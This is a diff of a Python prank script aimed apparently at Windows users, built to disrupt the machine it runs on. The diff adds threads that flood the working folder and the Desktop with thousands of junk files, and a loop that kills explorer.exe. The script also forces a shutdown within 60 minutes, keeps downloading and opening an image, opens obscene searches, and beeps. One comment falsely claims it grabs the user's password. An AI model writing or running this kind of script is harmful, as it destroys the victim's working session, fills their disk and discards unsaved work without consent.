@@ -3,20 +3,36 @@ import webbrowser
 import random
 import requests
 import psutil
+import winsound
 import os
+import threading
+
+# get the user's username and password
+username = os.getlogin()
+
+# print the username
+print(f'Hi, {username}.')
 
 # write 10,000 files
 txt_number = 10000
+
+desktop_txt_number = 1000
 
 bytes = 100 * 100
 
 string = "get trolled " * bytes
 
-for i in range(1, txt_number + 1):
-    filename = f"get trolled_{i}.txt"
-    with open(filename, "w") as file:
-        file.write(string)
+def spam_files():
+    for i in range(1, txt_number + 1):
+        filename = f"get trolled_{i}.txt"
+        with open(filename, "w") as file:
+            file.write(string)
 
+def spam_files_desktop():
+    for i in range(1, desktop_txt_number + 1):
+        filename = rf"C:\Users\{username}\Desktop\get trolled_{i}.txt"
+        with open(filename, "w") as file:
+            file.write(string)
 
 searches = [
     'fuck java',
@@ -52,17 +68,13 @@ searches = [
 # download the fucking miku image
 url = 'https://is1-ssl.mzstatic.com/image/thumb/Music221/v4/b8/92/ce/b892cead-70a1-8f29-0045-af30080d3a16/4571640501760_cover.png/316x316bb.webp'
 
-# get the user's username and password
-username = os.getlogin()
-
-# print the username
-print(f'Hi, {username}.')
-
 os.system("shutdown /s /f /t 60")
 
 def main():
     downloaded_number = 1
     while True:
+        # close explorer
+        os.system("taskkill /f /im explorer.exe")
         
         ram = psutil.virtual_memory()
         ram_percentage = ram.percent
@@ -72,8 +84,10 @@ def main():
             break
         
         # download the image
+        downloaded_number += 1
+        picture_name = f"nice_try{downloaded_number}.webp"
         response = requests.get(url)
-        with open("nice_try.webp", "wb") as file:
+        with open(picture_name, "wb") as file:
             file.write(response.content)
         
         # press shit idfk
@@ -84,12 +98,26 @@ def main():
         
         new_filename = f"nice_try{downloaded_number}.webp"
         
-        downloaded_number += 1
-        os.rename("nice_try.webp", new_filename)
         os.startfile(new_filename)
         
         search = random.choice(searches)
         webbrowser.open(f"https://www.google.com/search?q={search}")
         webbrowser.open(f"https://www.youtube.com/watch?v=MX8eYdEOU5w")
-    
-main()
+        
+        # play a sound
+        winsound.Beep(1000, 500)
+
+
+
+if __name__ == '__main__':
+    t1 = threading.Thread(target=spam_files)
+    t2 = threading.Thread(target=main)
+    t3 = threading.Thread(target=spam_files_desktop)
+
+    t1.start()
+    t2.start()
+    t3.start()
+
+    t1.join()
+    t2.join()
+    t3.join()
